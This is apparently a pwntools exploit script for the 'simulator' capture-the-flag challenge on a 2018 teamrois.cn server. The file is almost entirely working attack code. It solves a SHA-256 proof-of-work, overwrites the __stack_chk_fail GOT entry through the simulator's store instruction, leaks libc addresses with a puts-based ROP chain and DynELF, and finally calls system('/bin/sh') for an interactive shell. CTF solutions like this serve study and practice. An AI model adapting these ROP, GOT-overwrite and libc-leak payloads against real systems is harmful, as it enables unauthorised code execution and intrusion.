from pwn import *
from ctypes import *
import os
import roputils as rop
from hashlib import sha256

remote_addr = "simulator.2018.teamrois.cn"
remote_port = 3131

local_addr = "127.0.0.1"
local_port = 1807

pc = "./simulator"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)


uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0804AA49')
		#b *0x0804887F \n 
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)

puts_plt = pwn_elf.plt['puts']
vul_func = 0x0804AB88
pop_ret = 0x08048545
data = ''

def leak(address,length=4):
	global data
	sl('END')
	#tmp = rl()
	#print 'tmp' + tmp
	if(address%0x100 == 0xa):
		address = address + 1
	payload = 'A'*0x30
	payload += p32(puts_plt) + p32(pop_ret) + p32(address)
	payload += p32(vul_func)
	sla('comment: ',payload)
	up = ''
	buf = ''
	while True:
		c = p.recv(numb=1, timeout=1)
		#count += 1
		if up == '\n' and c == "":
			buf = buf[:-1]
			buf += "\x00"
			break
		else:
			buf += c
		up = c
	data = buf[:4]
	print "%#x => %s" % (address, (data or '').encode('hex'))
	return data

def change_2_data():
	sl('.data')

def change_2_text():
	sl('.text')

def input_data(data):
	payload = 'pop_ret' + ' ' + str(pop_ret)
	sl(payload)
	sl(data)

def input_code(code):
	sl(code)

def fuckingsha256():
	chal = rl().strip('\n')
	for i0 in range(0x100):
		for i1 in range(0x100):
			for i2 in range(0x100):
				for i3 in range(0x100):
					sol = chr(i0)+chr(i1)+chr(i2)+chr(i3)
					if(sha256(chal + sol).digest().startswith('\0\0\0')):
						return sol

def hack():
	raw_input()

	if local == 0:
		res = fuckingsha256()
		sl(res)
	fgets_got = pwn_elf.got['fgets']
	fgets_plt = pwn_elf.plt['fgets']
	puts_plt = pwn_elf.plt['puts']
	strncmp_got = pwn_elf.got['strncmp']
	strncmp_plt = pwn_elf.plt['strncmp']
	mmap_got = pwn_elf.got['mmap']
	stack_chk_fail_got = pwn_elf.got['__stack_chk_fail']
	addr_bss = pwn_rop.section('.bss') + 0x200
	
	vul_func = 0x08048680
	stdin_addr = 0x0804D080
	leave_ret = 0x0804AC56
	register_val = 0x0804DA24
	pop_ret = 0x08048545
	ppp_ret = 0x0804b339
	mapp0 = 0x4000000
	ret = 0x0804852e

	# step 1: overwrite __stack_chk_fail's got to the address of ret
	
	# Method 2: use lw/sw
	change_2_text()
	code = 'li $t0,' + str(leave_ret)
	input_code(code)
	offset = (stack_chk_fail_got - mapp0 - 4)/8 + 0xE0000000
	print hex(offset)
	code = 'li $t1,' + str(offset)
	input_code(code)
	code = 'sw $t0,$t1'
	input_code(code)

	# step 2: 
	# Method 2: use DynELF
	d = DynELF(leak, elf=ELF('./simulator'))
	system_addr = d.lookup('system', 'libc')
	lg('system_addr',system_addr)
	libc.address = system_addr - u32(data)
	lg('libc_addr',libc.address)
	
	# leak the value of stdin
	sl('END')
	payload = 'A'*0x30
	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
	payload += p32(vul_func)
	sla('comment: ',payload)
	stdin_addr = u32(rv(4))
	lg('stdin_addr',stdin_addr)

	# execute system('/bin/sh')
	sl('END')
	sh_addr = addr_bss
	payload = 'A'*0x30 + p32(fgets_plt) + p32(ppp_ret) + p32(sh_addr) + p32(8) + p32(stdin_addr)
	payload += p32(system_addr) + p32(vul_func) + p32(sh_addr)
	sla('comment: ',payload)
	sl('/bin/sh\0')
	p.interactive()

hack()